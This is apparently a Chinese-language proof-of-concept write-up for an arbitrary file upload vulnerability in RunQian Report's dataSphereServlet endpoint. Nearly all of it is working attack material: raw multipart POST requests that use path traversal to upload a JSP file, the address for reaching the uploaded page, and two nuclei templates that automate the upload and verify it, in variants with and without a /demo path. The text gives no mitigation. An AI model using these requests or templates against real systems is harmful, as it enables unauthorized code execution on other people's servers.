```
PosT /servlet/dataSphereServlet?action=38 HTTP/1.1
Host:127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept:*/*
Connection: close
Content-Length: 397
Content-Type: multipart/form-data;boundary=eac629ee4641cb0fe10596fba5e0c5d9

--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="openGrpxFile"; filename="539634.jsp"
Content-Type: text/plain

<% out.println("873227518"); %>
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition:form-data;name="path"

../../../
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="saveServer"

1
-eac629ee4641cb0fe10596fba5e0c5d9-
```

访问地址

http:*//192.168.31.133:6868/demo/539634.jsp*



nuclei

```
id: runqianbaobiaowenjianshangchuan

info:
  name: 润乾报表dataSphereServlet接口存在任意文件上传漏洞
  author: 紫色皓月
  severity: high
  description: 润乾报表dataSphereServlet接口存在任意文件上传漏洞
  tags: 2024,润乾报表,任意文件上传

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
  file_content: "{{to_lower(rand_text_numeric(32))}}"

requests:
  - raw:
    - |
      POST /servlet/dataSphereServlet?action=38 HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
      Accept-Encoding: gzip, deflate
      Accept: */*
      Connection: close
      Content-Length: 395
      Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="openGrpxFile"; filename="{{file_name}}"
      Content-Type: text/plain

      {{file_content}}
      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="path"

      ../../../
      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="saveServer"

      1
      --eac629ee4641cb0fe10596fba5e0c5d9--

    - |
      GET /{{file_name}} HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Connection: close
      Upgrade-Insecure-Requests: 1

    req-condition: true
    matchers:
      - type: word
        words:
          - "{{file_content}}"
        part: body

```





新搭建系统存在demo路径，网上查询已搭建好的部分不存在demo路径，poc给出两个方案。

存在demo路径POC：

```
POST /demo/servlet/dataSphereServlet?action=38 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 392
Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="openGrpxFile"; filename="539634.jsp"
Content-Type: text/plain

<% out.println("123456"); %>
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="path"

../../../
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="saveServer"

1
--eac629ee4641cb0fe10596fba5e0c5d9--
```

http:*//192.168.31.133:6868/demo/539634.jsp*

nuclei

```
id: runqianbaobiaowenjianshangchuan-DEMO

info:
  name: 润乾报表dataSphereServlet接口存在任意文件上传漏洞
  author: 紫色皓月
  severity: high
  description: 润乾报表dataSphereServlet接口存在任意文件上传漏洞
  tags: 2024,润乾报表,任意文件上传,DEMO

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
  file_content: "{{to_lower(rand_text_numeric(32))}}"

requests:
  - raw:
    - |
      POST /demo/servlet/dataSphereServlet?action=38 HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
      Accept-Encoding: gzip, deflate
      Accept: */*
      Connection: close
      Content-Length: 395
      Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="openGrpxFile"; filename="{{file_name}}"
      Content-Type: text/plain

      {{file_content}}
      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="path"

      ../../../
      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="saveServer"

      1
      --eac629ee4641cb0fe10596fba5e0c5d9--

    - |
      GET /demo/{{file_name}} HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Connection: close
      Upgrade-Insecure-Requests: 1

    req-condition: true
    matchers:
      - type: word
        words:
          - "{{file_content}}"
        part: body
```

